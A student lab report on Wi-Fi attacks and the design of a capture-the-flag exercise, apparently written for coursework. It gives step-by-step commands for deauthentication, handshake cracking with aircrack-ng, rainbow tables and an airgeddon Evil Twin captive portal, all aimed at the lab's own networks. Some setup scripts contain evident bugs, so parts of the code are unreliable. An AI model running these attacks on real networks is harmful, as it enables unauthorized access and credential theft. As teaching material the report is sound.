# NET4101 - HACK THE FLAG

## Members
- Mayssa AYACHI
- Renato DE CASTRO FERREIRA
- Mohamed Amine KHLIF
- Sarra KOSSENTINI

# INDEX

1. Introduction 
2. Vulnerabilities\
2.1. Eavesdropping \
2.1.1. Definition \
2.1.2. Attack implementation \
2.2. Brute Force \
2.2.1. Definition \
2.2.2. Attack implementation \
2.3. Rainbow Table \
2.3.1. Definition \
2.3.2. Attack implementation  \
2.4. Evil Twin \
2.4.1. Definition \
2.4.2. Attack implementation  \
2.5. DragonBlood \
2.5.1. WPA3-SAE \
2.5.2.  Definition \
2.5.3.  Fixes 
3. Capture the flag \
3.1. Requirements\
3.2. Architecture \
3.3. Configuration \
3.3.1. Router configuration \
3.3.2. OPEN Clients \
3.3.3. WPA2 Clients \
3.3.4. WPA3 Clients \
3.4. Obtaining the flag 
4. Conclusion 
5. Annex

# 1 INTRODUCTION

In today's digitized world, the importance of cybersecurity cannot be overstated. As society becomes increasingly reliant on digital technologies for communication, commerce, and critical infrastructure, the risks associated with cyber threats grow concurrently. Cybersecurity serves as the cornerstone for protecting sensitive information, preserving privacy, and maintaining the integrity of systems and networks.

In the domain of wireless networks, especially Wi-Fi connectivity, cybersecurity plays a paramount role. With wireless communication expanding across diverse domains, including homes, businesses, and public spaces, the vulnerabilities inherent in these networks become more pronounced. The broadcast nature of wireless transmissions amplifies the risk of eavesdropping, interception, unauthorized access, and network exploitation.

Securing Wi-Fi networks is essential. By implementing robust encryption mechanisms like WPA2 (Wi-Fi Protected Access 2) or WPA3, these protocols ensure that data transmitted over Wi-Fi networks remains confidential and secure.

Well-known security protocols implemented to date include:

- **WEP (Wired Equivalent Privacy):**
Released in 1999, WEP was one of the earliest encryption protocols used to secure wireless networks. It utilized the RC4 encryption algorithm but was soon found to be vulnerable to various attacks, such as the Fluhrer-Mantin-Shamir (FMS) attack and the KoreK attack.

- **WPA (Wi-Fi Protected Access):**
Utilizing the TKIP (Temporal Key Integrity Protocol) protocol, WPA was introduced in 2003 as an interim solution to address the weaknesses of WEP. However, it too faced vulnerabilities, notably through TKIP, which led to successful attacks such as dictionary attacks. 

- **WPA2 (Wi-Fi Protected Access 2):**
Released in 2004, WPA2 represented a significant improvement in Wi-Fi security, incorporating the more secure AES (Advanced Encryption Standard) encryption algorithm. While initially considered robust, vulnerabilities such as the KRACK (Key Reinstallation Attack) were discovered in 2017, highlighting the need for ongoing vigilance and updates in response to evolving threats.

- **WPA3 (Wi-Fi Protected Access 3):**
Introduced in 2018, WPA3 aims to improve upon its predecessors by introducing stronger encryption and authentication mechanisms, such as the Simultaneous Authentication of Equals (SAE) protocol. This enhances protection against brute-force attacks. Because WPA3 is relatively new, it has not been compromised yet. Despite some initial vulnerabilities, they have been addressed, ensuring WPA3 remains reliable as of 2024.

This lab was created with the purpose of gaining fundamental knowledge of various known attacks, such as Rainbow Table and Evil Twin. To achieve this goal, the lab employs a multi-protocol architecture, utilizing OPEN, WPA2, and WPA3, which automatically generates traffic while concealing a flag within it. The objective is to compete in capturing the flag by executing attacks on the architecture.

# 2 VULNERABILITIES
## 2.1 Eavesdropping
### 2.1.1 Definition

Open WiFi networks are wireless networks where traffic is not secured or encrypted, allowing users to connect without authentication. They are commonly found in public places, but their lack of security poses significant risks.
Eavesdropping attacks involve the unauthorized interception of communication between two parties, through which the attacker gains access to sensitive information.

There are various types of eavesdropping attacks:

- Physical Eavesdropping: This involves directly accessing communication lines or physical devices to intercept data. For instance, attackers might tap into telephone lines or place listening devices (bugs) in physical locations to capture conversations.

- Network Eavesdropping: In network eavesdropping attacks, attackers intercept data transmitted over a network. This can be accomplished by capturing and analyzing network traffic using packet sniffing tools. Attackers can monitor wireless transmissions to capture sensitive information or launch other types of attacks, such as session hijacking or Man-in-the-Middle attacks.

An eavesdropping attack simply listens to traffic and steals information from it. Therefore, it can be easily implemented on an open access point. However, to execute the attack on an encrypted network, it is necessary to know the Wi-Fi password for WPA/WPA2/WPA3.

### 2.1.2 Attack implementation

Tools-used: iw (linux default), ifconfig, wireshark 

#### Step 1 : Check your Wi-Fi modems

```
sudo iw dev
```

#### Step 2 : Delete previous interface from the modem that will be used
```
sudo iw dev <interface_name> del
```

#### Step 3 :  Add a monitor interface to the modem that will be used
Here, we are going to name the monitor interface as **mon0**.

```
sudo iw phy <physical_interface> interface add mon0 type monitor
```

#### Step 4 : List interfaces to ensure that the monitor interface was created and is in monitor mode
```
sudo iw dev
```

#### Step 5 : Change interface status to UP
```
sudo ifconfig mon0 up
```

#### Step 6 : Open Wireshark
```
sudo wireshark
```

#### Step 7 : Select the interface
In the Wireshark GUI, select the created monitor interface **mon0**.

#### Step 8 : Add wireless toolbar
In the Wireshark GUI, go to the menu **View** and enable the **Wireless Toolbar**

#### Step 9 : Select channel and bandwidth
In the Wireshark GUI, select the channel and bandwidth according to the specifications of the Wi-Fi network for which you want to monitor the traffic.

#### Step 10 : Filter the traffic

##### Step 10.1 : Find out the BSSID from the network

In the Wireshark GUI, filter the traffic by beacon packets and ssid.

```
wlan.fc.type_subtype == 8 && wlan.ssid == "<SSID>"
```

##### Step 10.2 : Filter traffic by BSSID

Inside the **IEEE 802.11 Beacon Frame**, search for the BSSID, right-click on it and select **Apply as filter > Selected**

**Now you can see all the Wi-Fi traffic from the network!**


## 2.2 Brute Force
### 2.2.1 Definition
A Brute Force attack is a method used by attackers to gain unauthorized access to a system, application, or encrypted data by systematically trying all possible combinations of passwords or encryption keys until the correct one is found. This attack relies on the computational power of modern computers to exhaustively test every possible password within a given character set.

In the context of wireless security, Brute Force attacks are commonly employed to crack the encryption keys used to secure Wi-Fi networks, such as WPA. Attackers utilize automated tools to generate and test a vast number of password permutations rapidly, aiming to discover the correct passphrase and gain access to the network.

Brute Force attacks pose a significant threat to the confidentiality and integrity of sensitive information transmitted over wireless networks. Successful compromise of network credentials can grant attackers unrestricted access to network resources, enabling them to eavesdrop on communications, intercept data, or launch further malicious activities.

### 2.2.2 Attack implementation
For demonstration purposes, we will detail the implementation of a Brute Force attack targeting a WPA2 Wi-Fi network using Kali Linux.

#### Step 1 : Kill Processes Related To The Network
This can be achieved simply running:

```
sudo airmon-ng check kill
```

#### Step 2 : Put Wireless Interface In Monitor Mode
In order to allow the computer to monitor all Wi-Fi traffic,  it is needed to change the Wireless Network Card mode from Managed to Monitor. Run the following command in order to do that, changing **wlan0** by the name the network interface:

```
sudo airmon-ng start wlan0
```

#### Step 3 : Scan Available Networks
After the previous step, the interface has been put in monitor mode and its name has been changed to **wlan0mon**, in this guide's case. To discover nearby Wireless Networks and its related clients, do:
```
sudo airodump-ng wlan0mon
```

#### Step 3 : Capture Handshake
To capture the Handshake, we need first to deauthenticate the user and when he tries to reauthenticate we will be able to capture the Handshake.
To deauthenticate users from the target WIFI network, we need to run this command :

```
sudo aireplay-ng --deauth 100 -a [BSSID] wlan0mon --ignore-negative-one
```

Before initiating the Brute Force attack, capture the handshake of the target WPA Wi-Fi network using a tool like Airodump-ng:

```
airodump-ng wlan0 --channel [channel_number] --bssid [BSSID] -w capture_file
```
channel_number is the channel of the target network
BSSID is the MAC address of the access point

#### Step 4 : Configure the Attack
Configure the selected Brute Force tool to target the captured handshake file and initiate the attack.

We need first to have the dictionnary that will be used during the attack. Run the following command:
```
wordlists
```
and then type y to extract the wordlist rockyou.txt

#### Step 5 : Initiate the Attack
We will use the Aircrack-ng to find the Wi-Fi password. The tool will systematically generate and test password permutations, attempting to crack the passphrase.

```
aircrack-ng -w wordlists/rockyou.txt -b [BSSID] capture_file.cap 
```

#### Step 6 : Monitor Progress
Monitor the progress of the Brute Force attack as the tool iterates through password combinations. Depending on the complexity of the password and computational resources available, the attack may take varying amounts of time to complete.

#### Step 7 : Access Gained
If the Brute Force attack successfully discovers the correct password (in our case "12345678"), the attacker gains unauthorized access to the WPA Wi-Fi network. With access granted, the attacker can exploit vulnerabilities, extract sensitive information, or carry out further malicious activities.

Here's an example of what you might see when Aircrack-ng successfully cracks a password:
```
KEY FOUND! [ 12345678 ]
Master Key      : AB CD EF 12 34 56 78 90 12 34 56 78 90 12 34 56
Transient Key   : CD EF 12 34 56 78 90 12 34 56 78 90 12 34 56 78
EAPOL HMAC      : 12 34 56 78 90 12 34 56 78 90 12 34 56 78 90 12

```

## 2.3 Rainbow Table
### 2.3.1 Definition
The passwords in a computer system are not stored directly as plain texts but are hashed using encryption. A hash function is a 1-way function, which means that it can’t be decrypted. Whenever a user enters a password, it is converted into a hash value and is compared with the already stored hash value. If the values match, the user is authenticated.

The rainbowtable is a precomputed dictionary of plaintext passwords and their corresponding hash values that can be used to find out what plaintext password produces a particular hash. Doing an rainbowntable attack is quicker than a simple bruteforce attack because the hash value was previously calculated.

**Prerequisites:**
Before performing a rainbowTable attack, you need to :
- find the hash of the password  you want to decrypt. 
- find information about the form of the plaintext password (minimum and maximum length, format: numbers, alphabet, special characters..) by looking at the format of allowed passwords of the target application/system.

### 2.3.2 Attack implementation
#### Step 1 : Install rainbowcrack package
Open a terminal in kali and install the rainbowcrack package:
```
sudo apt install rainbowcrack
```

#### Step 2 : Generate a rainbow table
Open the help menu of rtgen to display the options:
```
rtgen -h
```

Choose an option that corresponds to the form of the password and modify the following according to your case. 

```
rtgen <hash_algorithm> <charset> <length_min> <length_max> <table_index> <chain_min> <chain_num> <part_index>
```

Example: for a password "12345678", the following options can be used: 

```
sudo rtgen md5 numeric 1 8 0 100000 100000 0
```

We chose the values of 100000 and 100000 for the chain_length and chain_num to be able to have a larger rainbowTable (so it will include our password).

The creation of the rainbow table takes much time and storage space on system, but after creating it, we will be able to use it to crack passwords faster than with brute force.

The rainbow table will be stored in /usr/share/rainbowcrack directory.

#### Step 3 : sort the rainbowTable
Go to the directory where the table file .rt is stored and sort the rainbowTable.
```
cd /usr/share/rainbowcrack
sudo rtsort .
```

#### Step 4 : find the password
Use RainbowCrack tool to crack the password hash.
```
rcrack . -h <hash_of_password>
```

In our example, the md5 hash of the password "12345678" is "25d55ad283aa400af464c76d713c07ad".

## 2.4 Evil Twin
### 2.4.1 Definition
An Evil Twin attack is a sophisticated wireless security threat where a malicious actor sets up a rogue wireless access point (AP) that impersonates a legitimate network. This fraudulent AP, often configured with the same SSID (Service Set Identifier) and encryption parameters as the genuine network, deceives unsuspecting users into connecting to it instead of the authentic network.

The primary objective of an Evil Twin attack is to intercept sensitive information transmitted between users and network resources. By luring users to connect to the rogue AP, attackers can capture network traffic, including login credentials, financial data, or personal information. This type of attack exploits the trust users place in wireless networks, posing significant risks to the confidentiality and integrity of their data.

This attack can be particularly effective in places like airports, cafes, and hotels, where users frequently connect to public Wi-Fi networks without verifying their legitimacy. 

In this report, we will demonstrate our implementation of the evil twin attack on an OPEN, WPA or WPA2 Wi-Fi network.

### 2.4.2 Attack implementation
These are the steps that we have done it to implement the evil twin attack.
#### Step 1 : Install airgeddon :
```
sudo apt update && sudo apt install airgeddon
```

#### Step 2 : Put interface on monitor mode
Killing Wi-Fi related processes.
```
sudo airmon-ng check kill
```

Starting monitor interface (usually the interface name is wlan0, but you can check it by running **sudo iw dev**).
```
sudo airmon-ng start wlan0
```

Now the interface should be in monitor mode, and its name has been changed from "yourWifiInterface" to "yourWiFiInteface**mon**"
#### Step 3 : Start airgeddon
```
sudo airgeddon
```

Firstly, airgeddon is going to check if you have all necessary packets installed. Press **Enter** to enter in airgeddon terminal.

#### Step 4 : Select network in airgeddon
Check for **wlan0mon** {**your interface name**} in airgeddon list, and type the number corresponding to it.

#### Step 5 : Start Evil Twin attack
##### Step 5.1 Select attack
Select option 7

##### Step 5.2 Find target
```
Select option 4 and then Enter.
```

A new terminal will open. Let it run for a while to capture the networks, then press Ctrl+C and go back to the main terminal.

```
Select the desired network and press enter.
```

##### Step 5.3 Select attack with captive portal 
```
Select option 9. Press enter twice.
```
Let the scan run for a while ..
```
Press Ctrl+C.
```
##### Step 5.4 Select network again
```
Select the desired SSID.
```
##### Step 5.5 Select the Deauthntication attack method
```
Select option 1 (Deauth / disassoc amok mkd4 attack).
```
```
In {spoof your MAC address}, select y
```
```
In {captures hadshake file}, select n
```
```
In {timeout}, type 100
```
```
Press Enter.
```

If the handshake capture was successful, you'll see a message saying "Congratulations !!"

```
Press Enter four times.
```
```
Select captive portal laguage.
```
```
In {captive lortal logo}, select n.
```
```
Press Enter.
```

Wait for the victim to connect to the fake access point and type the right password.

When this happens, you'll get the Wi-Fi password.


## 2.5 DragonBlood
### 2.5.1 WPA3-SAE
The SAE method present on WPA3 represents a significant advancement in wireless encryption, particularly when compared to its predecessor, WPA2-PSK. One critical vulnerability in WPA2 lies in its multi-stage handshake process for negotiating session keys, which renders it susceptible to KRACK attacks, as previously discussed in this report.

SAE addresses these vulnerabilities head-on, fortifying WLANs against potential breaches and safeguarding data traffic in mesh networks. Simultaneous Authentication of Equals significantly enhances security, particularly in cases of weak passwords, rendering it impractical to infer key information through handshake recordings.

Moreover, the key exchange protocol of SAE boasts Perfect Forward Secrecy (PFS), ensuring that even if session keys were to be compromised, past communications remain impervious to decryption. This resilience extends to scenarios where WLAN passwords are subsequently exposed, as recorded data packets remain indecipherable.

While SAE retains the use of shared passwords for WLAN access, it introduces a crucial innovation: the derivation of a unique Pairwise Master Key (PMK) for each client from these passwords. This personalized PMK makes it possible for every client to set its own encryption key which isn't shared with others, avoiding Eavsdrop attacks.

Through a four-way handshake between WLAN clients and authentication servers, Pairwise Transient Keys (PTKs) are derived from the PMKs, serving as the foundation for data encryption. This meticulous approach ensures that each client's communication remains isolated and protected, even within shared password environments.

### 2.5.2 Definition
In April 2019, Mathy Vanhoef and Eyal Ronen published a paper titled "Dragonblood: Analyzing the Dragonfly Handshake of WPA3 and EAP-pwd," which exposed five vulnerabilities in the WPA3 protocol. Despite being heralded as "unbreakable" upon its release by the Wi-Fi Alliance, these vulnerabilities shed light on potential weaknesses in the protocol, particularly in its Dragonfly handshake mechanism. For the purpose of this Capture the Flag competition, this report will focus on the vulnerabilities related to the Dragonfly handshake, omitting discussion of EAP-pwd as enterprise networks are not within the scope.

1. **Downgrade Attack Against WPA3-Transition:** This attack exploits the transition mode defined in the WPA3 specification, where a Wi-Fi network supports both WPA3 and WPA2 with the same password. An adversary can set up a rogue WPA2-only network to lure clients that support WPA3. By capturing partial WPA2 handshakes, the attacker can then launch brute-force or dictionary attacks to recover the password without needing a man-in-the-middle position.

2. **Security Group Downgrade Attack:** During the handshake initiation, the client sends a commit frame indicating the preferred security group. If the AP doesn't support this group, it responds with a decline message, prompting the client to select another group. An attacker can impersonate an AP and send forged decline messages to force clients into choosing a weaker security group, thereby compromising the network's security.

3. **Timing-Based Side-Channel Attack:** This attack leverages timing discrepancies in AP responses to commit frames to infer information about the password. While NIST elliptic curves don't leak timing information, other curves like Brainpool or multiplicative security groups modulo a prime do. By analyzing response times, an attacker can execute a dictionary attack to guess the password.

4. **Cache-Based Side-Channel Attack:** By observing memory access patterns on a victim's device during the construction of a commit frame in a Dragonfly handshake, an attacker can deduce information about the password. This can be achieved through controlling applications on the victim's device or even executing JavaScript code in the victim's browser. The leaked patterns facilitate a dictionary attack to guess the password.

5. **Denial-of-Service (DoS) Attack:** This attack involves overloading Access Points (APs) by generating a relatively low number of forged commit frames per second. This causes high CPU usage on the AP, draining its battery, and impeding or delaying other devices from connecting via WPA3. Additionally, it may disrupt other functionalities of the AP, resulting in a DoS scenario.

In practice the WPA3 attacks which are more relevant are downgrade attacks and timing attacks against resource-constrained devices.

### 2.5.3 Fixes
Months following the discovery of the vulnerabilities, the Wi-Fi Alliance took proactive steps to address the issues by privately formulating backward-compatible security guidelines. In November 2019, they publicly released a set of guidelines aimed at bolstering the security of WPA3:

- **Prohibition of Brainpool Curves:** The guidelines explicitly prohibited the use of Brainpool curves, which were found to be susceptible to timing-based side-channel attacks.

- **Avoidance of Side-Channels in SAE Implementations:** It was mandated that implementations of Simultaneous Authentication of Equals (SAE) must mitigate the risk of side-channel attacks, enhancing the robustness of the protocol.

- **Enforcement of Separate Passwords for WPA3 and WPA2 Networks:** To mitigate the risk of downgrade attacks, vendors were instructed that if their implementation of WPA3-Transition did not meet all security requirements, WPA3 and WPA2 networks should utilize distinct passwords and be logically segregated from each other.

However, these implementations were found to be resource-intensive and negatively impacted the performance of lightweight IoT devices, prompting concerns within the industry.

As of 2024, most vendors have implemented fixes to address the vulnerabilities, effectively bolstering the security of WPA3 once again. For instance, during our research, attempts were made to execute a WPA3 downgrade attack using a Samsung Android 14 client. However, the attack was unsuccessful, as the client promptly detected the suspicious activity and displayed a warning message.

# 3 CAPTURE THE FLAG
## 3.1 Requirements
The hardware requirements for the Capture the Flag competition are relatively straightforward:

- **Router:** It should include firewall capabilities, support the creation of multiple Wi-Fi networks, and have WPA2/WPA3 encryption enabled.

- **Clients:** Four Raspberry Pi devices or computers running the Raspberry Pi OS, each equipped with WPA2/WPA3 compatible network cards.

To streamline the setup process for the competition, it is advisable to utilize OpenWrt. Below, we outline a step-by-step configuration guide (section 3.3.1) for implementing OpenWrt.

## 3.2 Architecture
The competition's infrastructure comprises three wireless networks employing different levels of security: no-encryption, WPA2-PSK, and WPA3-SAE. These technologies were selected based on their prevalence in wireless networks as of 2024.

The deployment of an open wireless network serves as a distractor, intentionally devoid of any relevant information leading to the flag. However, this network generates significant traffic from a single client, adding to the challenge for participants. Introducing distractions enhances the competition's complexity, as the winner is determined by a timely manner.

Within the WPA2 network, two clients engage in HTTP traffic, simulating an unencrypted chat application. At a certain point in the conversation, one of the clients inadvertently reveals the WPA3 password.

Inside the WPA3 network, a single client is connected, generating minimal traffic as possible. This client has a weak SSH password, and the flag is concealed within its files, encoded in base64. Upon gaining access to the WPA3 network, participants must locate and infiltrate this client, decipher the message within the unidentified flag file, and successfully obtain the flag.

## 3.3 Configuration
### 3.3.1 Router Configuration

To establish the requisite networks for the Capture The Flag event, three distinct wireless networks must be set up, each isolated from the others. This can be accomplished through several means:

1. **Consumer Routers:** Utilize three separate consumer-grade routers with their default firmware.
2. **Enterprise Router + Access Point Setup:** Configure isolated networks using different VLANs with enterprise-grade hardware.
3. **OpenWRT:** Opt for routers with OpenWRT installed, our chosen solution for this implementation. However, any of the aforementioned options are viable.

#### 3.3.1.1 OpenWRT Installation Procedure

Before proceeding with OpenWRT installation, it's needed to confirm compatibility with the chosen router model. Refer to the [Table of Hardware](https://openwrt.org/toh/views/toh_fwdownload) to verify compatibility. If supported, follow the steps outlined in the [Quick Start Guide for OpenWRT Installation](https://openwrt.org/docs/guide-quick-start/start).

Throughout this report, we'll be utilizing a Linux Router, specifically the [PC Engines Apu4C4](https://www.pcengines.ch/apu4c4.html). Keep in mind that each APU4 model may have different driver requirements, depending on the selected Wi-Fi card. Refer to TekLager's [OpenWRT installation instructions](https://teklager.se/en/knowledge-base/openwrt-installation-instructions/) for a comprehensive tutorial on OS and driver installation for this board.

#### 3.3.1.2 Wi-Fi Network Setup

##### APU4C4 With OpenWRT

For APU4C4 running OpenWRT 23.05.2, download the provided [backup image](https://github.com/l4ti/TSP-NET4104-HackTheFlag/blob/main/scripts/Router/backup-OpenWrt.tar.gz) from the Capture The Flag GitHub repository. 

To restore the backup: System > Backup/Flash Firmware > Restore > **Upload archive...**

There is no password for the Root user of the router. We recommend setting it once the backup is restored.

| Wi-Fi Type | SSID                 | Password              | IP Block       |
| ---------- | -------------------- | --------------------- | -------------- |
| Open       | STARBUCKS_FREE_WIFI  | None                  | 192.168.0.0/24 |
| WPA2       | Starbucks_Employees  | 9876543210            | 192.168.2.0/24 |
| WPA3       | Starbucks_Management | TSP#net4104.challenge | 192.168.3.0/24 |

#### Other Router Configurations

The following requirements outline the setup for the wireless networks:

| Wi-Fi Type   | Password Requirements                                                                                    | Details                                                                     |
| ------------ | -------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------- |
| Open Network | No password                                                                                              | No access to the router's configuration page (or usage of a very strong password) |
| WPA2         | Password listed in [RockYou's leaked database](https://github.com/josuamarcelc/common-password-list) | No access to the router's configuration page (or usage of a very strong password) |
| WPA3         | 8 to 16 digits, including numbers, letters, and special characters                                        | Access to the router's configuration page with a very strong password           |

Ensure that each network is effectively isolated from the others.

### 3.3.2. OPEN Clients
As discussed earlier, the concept behind the Open Wi-Fi Network is to strategically mislead competitors in the "hack the flag" challenge by creating the illusion of significant activity within the network. This entails generating random traffic to attract attention effectively.

A practical approach to achieve this goal involves developing a bash script designed to simulate genuine user interactions within an open Wi-Fi environment. This script generates diverse network activities to emulate typical user behaviors. By continuously initiating various types of network requests such as pings, DNS queries, and HTTP requests directed towards different destinations, it replicates the patterns observed in genuine network traffic.

The code can be seen [here](https://github.com/l4ti/TSP-NET4104-HackTheFlag/blob/main/scripts/Clients/Open/generationTraffic.sh)

### 3.3.3 WPA2 Clients
#### Failed version
We prepared a chat application to generate a random traffic between two users using SocketIO. But we couldn't analyze the traffic using Wireshark.So we decided to create a new chat application using HTTP. 

#### Successful version
Within the WPA2 network, we developed a Python application simulating an HTTP unencrypted chat application. In order to implement our chat app, we are using two computers running Ubuntu which simulate two coworkers, John and Mary, having a conversation. At a certain point in the dialogue, one of them inadvertently reveals the WPA3 password. The idea is that the participants of the championship start analyzing the traffic going through the network with Wireshark, eavesdropping on John and Mary's conversation and successfully obtaining the WPA3 password.

We preferred making the hackers aware of the WPA3 password through this method because most WPA3 vulnerabilities have been patched and there isn't a simple WPA3 cracking tool which will seamlessly work in most scenarios.

We prepared a bash script to automate the traffic generation. You can check it the annex below. 

### 3.3.4 WPA3 Clients
For this phase of the lab setup, a Raspberry Pi serves as the crucial component, acting as the final piece necessary to attain the flag.

The Raspberry Pi should be configured with default login credentials: username **pi** and password **raspberry**. This simplifies the process of discovering the password and gaining access to the system.

The flag is concealed within the archives of the **pi** user's home folder, encoded in Base64 to add a layer of complexity for participants attempting to locate it. Furthermore, the flag archive is disguised as a text file with a ".svg" extension, adding an additional challenge for participants.

To streamline the client setup, executing the automated script as root suffices. The following commands facilitate this process:

```
wget https://raw.githubusercontent.com/l4ti/TSP-NET4104-HackTheFlag/main/scripts/Clients/Wpa3/installScript.sh
chmod +x installScript.sh
sudo ./installScript.sh
rm installScript.sh install.log
clear
```

## 3.4 Obtaining the Flag
This section outlines the step-by-step process to successfully retrieve the flag.

### Step 1: Download Kali Linux
The only requirement is to have a pen drive with a capacity of 8GB or more. Note that all data on the pen drive will be lost during the process.

Official guides are available for creating a bootable pen drive:
- [Windows](https://www.kali.org/docs/usb/live-usb-install-with-windows/)
- [Linux](https://www.kali.org/docs/usb/live-usb-install-with-linux/)
- [MacOS](https://www.kali.org/docs/usb/live-usb-install-with-mac/)

### Step 2: Boot into Kali Linux
Refer to the manufacturer's instructions for booting from a pen drive on your device.

### Step 3: Brute Force the WPA2 Network
Refer to Section 2.2 of this report for instructions on performing a Brute Force attack to obtain the WPA2 network password.

### Step 4: Eavesdrop on the WPA2 Network
Using Wireshark, follow the guide in Section 2.1 and apply the filter `ip.dst==192.168.2.0/24 and http` to intercept chat messages. Analyze these messages to discover the WPA3 password.

### Step 5: Connect to WPA3
Connect to the WPA3 network using the password obtained from eavesdropping on the WPA2 network.

### Step 6: Scan the Network
Input the WPA3 network (by default, 192.168.3.0/24) into the target field and select "ping scan" in the Profile section of Zenmap. This will ping all hosts in the network to identify active ones.

### Step 7: Access the Server
The server is a Raspberry Pi, which typically has the default username **pi** and password **raspberry**.

### Step 8: Locate the Flag
Navigate to the `/home/pi` directory on the Raspberry Pi and use the `cat` command to open files. One of these files contains the flag encoded in Base64. To decode the flag, use the following command:

```
cat FILE | base64 -d
```

# 4 CONCLUSION
In conclusion, our project serves as an immersive and highly engaging introduction to the field of cybersecurity, particularly focusing on the vulnerabilities present in Wi-Fi networks. By providing a hands-on experience through the Capture The Flag challenge, we aim to offer a practical stepping stone for individuals interested in exploring this dynamic and vital area of technology.

One of the primary objectives of our project is to raise awareness about the inherent vulnerabilities in Wi-Fi networks, which are often overlooked or underestimated. Through the simulation of real-world attack scenarios, participants gain firsthand experience of the threats posed by eavesdropping, brute force attacks, Evil Twin attacks, and other potential security breaches. This heightened awareness is crucial in fostering a proactive approach to cybersecurity, encouraging individuals to implement robust security measures to protect their digital assets.

It's important to emphasize that our Capture The Flag challenge is specifically designed for beginners in the cybersecurity field. While experienced hackers may find aspects of the challenge intriguing, its primary aim is to provide a learning platform for those new to cybersecurity. By focusing on foundational concepts and practical implementation, we aim to demystify complex cybersecurity concepts and empower beginners to develop essential skills in threat detection, analysis, and mitigation.

Looking ahead, our goal is to maintain the availability of the challenge on GitHub, accompanied by comprehensive explanations and documentation. This resource will serve as a valuable educational tool for high school students, university freshmen, and anyone else looking to explore cybersecurity in a hands-on and practical manner. By making the challenge accessible and user-friendly, we hope to inspire the next generation of cybersecurity professionals and contribute to building a more secure digital future.

# 5 ANNEX

### Open Wi-Fi Script
```
#!/bin/bash
if [[ "$OSTYPE" == "linux-gnu" && $(command -v dpkg &>/dev/null) ]]; then 
    echo "You are running Linux (Debian-based)."

    if dpkg -s "wget dnsutils iputils-ping" >/dev/null 2>&1; then
        echo "All packages are installed, continuing..."
    else
        echo "Installing packages (sudo required!)"
        sudo apt update
        sudo apt install wget dnsutils iputils-ping -y
        echo "Packages installed"
    fi

    echo "Initiating traffic generation (infinite loop)"
    while true;
    do
        random=$(( (RANDOM % 16) + 1 ))
        case $random in
        
            1) ping -i 0.2 -c 5 8.8.8.8 >/dev/null ;;
            2) ping -i 0.2 -c 5 1.1.1.1 >/dev/null ;;
            3) ping -i 0.2 -c 5 uol.com.br >/dev/null ;;
            4) ping -i 0.2 -c 5 google.com >/dev/null ;;
            5) ping -i 0.2 -c 5 linkedin.com >/dev/null ;;
            6) ping -i 0.2 -c 5 facebook.com >/dev/null ;;
            7) ping -i 0.2 -c 5 amazon.com >/dev/null ;;
            8) ping -i 0.2 -c 5 instagram.com >/dev/null ;;
            9) dig google.com +short >/dev/null ;;
        10) dig facebook.com +short >/dev/null ;;
        11) dig amazon.com +short >/dev/null ;;
        12) dig instagram.com +short >/dev/null ;;
        13) wget -qO- http://google.com >/dev/null ;;
        14) wget -qO- http://facebook.com >/dev/null ;;
        15) wget -qO- http://amazon.com >/dev/null ;;
        16) wget -qO- http://instagram.com >/dev/null ;;
        17) wget -qO- https://vertexa.com.br/ >/dev/null ;;
        18) wget -qO- https://www.linkedin.com/login/fr >/dev/null ;;
        esac

        # Sleep for a while (decreased)
        sleep $(( (RANDOM % 3) + 1 ))

    done


else
    echo "This script requires Linux (Debian-based) with dpkg installed."
    exit 1
fi
```

### WPA2 Script
```
#!/bin/bash
# Clone the repository from GitHub
git clone https://github.com/l4ti/TSP-NET4104-HackTheFlag.git

# Navigate into the cloned directory
cd TSP-NET4104-HackTheFlag

# Update package index
sudo apt update

# Install Python 3 and pip3
sudo apt install -y python3 python3-pip

# Install Flask and SQLAlchemy using pip3
pip3 install flask flask_sqlalchemy

# Run the Python main code
python3 main.py

# Run the Python post command 10 times
./John.sh #when asked, write the IP address on with your main application is running
./Mary.sh #when asked, write the IP address on with your main application is running
```

## WPA3 Script
```
#!/bin/bash

if [[ "$OSTYPE" == "linux-gnu" && $(command -v dpkg &>/dev/null) ]]; then
	echo "You are running Linux (Debian-based)."
	
	if [ "$EUID" -ne 0 ]
		then
		echo "Please run as root. Exiting..."
		exit
	fi
	
	mkdir install.log
	echo "Updating system"
	{
		apt update
		apt upgrade -y
	} > install.log
	echo "Installing OpenSSH and Nginx"
	{
		apt install openssh nginx -y
	} > install.log
	cat /etc/passwd | grep "pi:" >/dev/null 2>&1
	if [ $? -eq 0 ] ; then
		echo "Pi User Exists"
	else
		echo "User Not Found. Creating user..."
		useradd -m pi
	fi
	
	echo "pi:raspberry" | chpasswd
	echo "NEW PI USER PASSWORD: raspberry"

	echo "Populating Home Directory"
	dd if=/dev/urandom of=/home/pi/img01.jpg bs=1M count=10
	dd if=/dev/urandom of=/home/pi/img02.jpg bs=1M count=8
	dd if=/dev/urandom of=/home/pi/img03.jpg bs=1M count=11
	dd if=/dev/urandom of=/home/pi/school.docx bs=132K count=1
	dd if=/dev/urandom of=/home/pi/passport.pdf bs=512K count=5
	dd if=/dev/urandom of=/home/pi/data.txt bs=256K count=3
	dd if=/dev/urandom of=/home/pi/dog.png bs=1M count=7
	dd if=/dev/urandom of=/home/pi/confidential.zip bs=2M count=4
	dd if=/dev/urandom of=/home/pi/amelia.txt bs=128K count=2
	dd if=/dev/urandom of=/home/pi/document09.doc bs=256K count=6
	dd if=/dev/urandom of=/home/pi/employee42.jpg bs=1M count=9
	dd if=/dev/urandom of=/home/pi/quotation.txt bs=64K count=8
	dd if=/dev/urandom of=/home/pi/newdocument-2.xlsx bs=512K count=3
	dd if=/dev/urandom of=/home/pi/shareholders.pptx bs=1M count=7
	dd if=/dev/urandom of=/home/pi/employee_list.csv bs=256K count=4
	dd if=/dev/urandom of=/home/pi/autoAuthDB.sh bs=64K count=2
	dd if=/dev/urandom of=/home/pi/document.pdf bs=768K count=5
	dd if=/dev/urandom of=/home/pi/contacts.tar.gz bs=2M count=6
	dd if=/dev/urandom of=/home/pi/graph.jpg bs=1M count=8
	
	echo "Creating the Flag"
	touch /home/pi/cat.svg
	echo "Congratulations! You found the flag." | base64 > home/pi/cat.svg
	echo "Changing ownership of files"
	sudo chown -R pi:pi /home/pi
	
	echo "FINISHED CONFIGURATION"
	echo "Remember to remove this script and clear the history of commands from the machine."

else
	echo "This script requires Linux (Debian-based) with dpkg installed."
	exit 1
fi
```